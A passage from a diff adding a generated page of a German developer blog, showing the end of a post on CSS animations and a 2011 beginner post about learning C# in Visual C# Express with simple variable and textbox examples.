+	<span class="nl">-webkit-animation</span><span class="p">:</span> <span class="n">move</span> <span class="m">2s</span> <span class="n">infinite</span><span class="p">;</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <p>CSS-Animationen stellen schon heute eine gute Möglichkeit dar HTML-Elemente zu animieren. Zu wüschen wäre jedoch eine bessere Unterstützung der Browser und kein Zwang zur Nutzung der browserspezifischen Prefixe. 
+                Da der Internet-Explorer jedoch immer noch eine große Verbreitung aufweist, muss mit der Verwendung noch ein wenig gespart werden, bzw. ein Fallback angeboten werden.</p>
+            </div>
+          </article>
+          <article itemscope itemtype="http://schema.org/BlogPosting">
+            <header>
+              <div class="meta">
+                <span class="category">Entwicklung</span> &ndash; 
+                <time itemprop="datePublished" datetime="2011-09-20T00:00:00+02:00" class="date">20.09.2011</time> &ndash;
+                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+              </div>
+              <a href="/artikel/2011/09/c-und-ich">
+                <h2 itemprop="headline">C# und Ich</h2>
+              </a>
+              <div class="warning">
+                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+              </div>
+            </header>
+            <div itemprop="articleBody">
+              <p>Mit der Zeit muss man sich auch wieder einmal an etwas Neuem versuchen. Genau das habe ich jetzt gemacht und somit habe ich angefangen C# zu lernen. Zu empfehlen ist dazu eine IDE, also eine integrierte Entwicklungsumgebung. Ich habe Microsoft Visual C# Express von Microsoft verwendet, das man <a href="http://www.microsoft.com/germany/express/download/default.aspx">hier</a> downloaden kann. Der Download und die Installation kann hierbei jedoch eine Weile dauern.</p>
+              <p><img src="/assets/img/picture_34.png" alt="C#" /></p>
+              <p>Was man also dazu braucht:</p>
+              <ul>
+                <li>Microsoft Visual C#</li>
+                <li>Geduld</li>
+              </ul>
+              <p>Wenn man, so wie ich, von PHP kommt ist erst einmal zu beachten, dass man genau angeben muss welcher Typ in einer Variable abgespeichert wird. Zum Beispiel:</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="n">String</span> <span class="n">variable</span> <span class="p">=</span> <span class="s">"Hallo Welt"</span><span class="p">;</span></code></pre>
+              </figure>
+              <p>oder</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="n">Double</span> <span class="n">result</span> <span class="p">=</span> <span class="m">12</span> <span class="p">*</span> <span class="m">234</span><span class="p">;</span></code></pre>
+              </figure>
+              <p>Natürlich gibt es noch weitere, aber so weit bin ich eben auch noch nicht.
+                Man kann im Entwurfsfenster die Anordnung der Elemente verändern und sie auch umbenennen. Dann gibt man im Code, zu dem man durch einen Doppelklick kommt, den Namen des Elementes ein und es werden einem die verschiedenen Methoden und Eigenschaften vorgeschlagen. Den Text eines Textfeldes ruft man zum Beispiel so ab:</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="n">String</span> <span class="n">text</span> <span class="p">=</span> <span class="n">meinetextbox</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span></code></pre>
+              </figure>
+              <p>Vielleicht kommen ja in nächster Zeit weitere Beiträge zu C#!</p>
+            </div>
+          </article>
+        </div>
+        <nav id="pagenav">
+          <span id="left">
+            <a href="/23/" rel="prev">&laquo; NEUER</a>
+          </span>
+          <span id="pages">
+            <a  href="/">1</a>
+            <a  href="/2">2</a>
+            <a  href="/3">3</a>
+            <a  href="/4">4</a>
+            <a  href="/5">5</a>
+            <a  href="/6">6</a>
+            <a  href="/7">7</a>
+            <a  href="/8">8</a>
+            <a  href="/9">9</a>
+            <a  href="/10">10</a>
+            <a  href="/11">11</a>
+            <a  href="/12">12</a>
+            <a  href="/13">13</a>
+            <a  href="/14">14</a>
+            <a  href="/15">15</a>
+            <a  href="/16">16</a>
+            <a  href="/17">17</a>
+            <a  href="/18">18</a>
+            <a  href="/19">19</a>
+            <a  href="/20">20</a>
+            <a  href="/21">21</a>
+            <a  href="/22">22</a>
+            <a  href="/23">23</a>
+            <a class="active" href="/24">24</a>
+            <a  href="/25">25</a>
+            <a  href="/26">26</a>
+            <a  href="/27">27</a>
+          </span>
+          <span id="right">
+            <a href="/25/" rel="next">ÄLTER &raquo;</a>
+          </span>
+        </nav>
+      </main>
+    </div>
+  </body>
+</html>
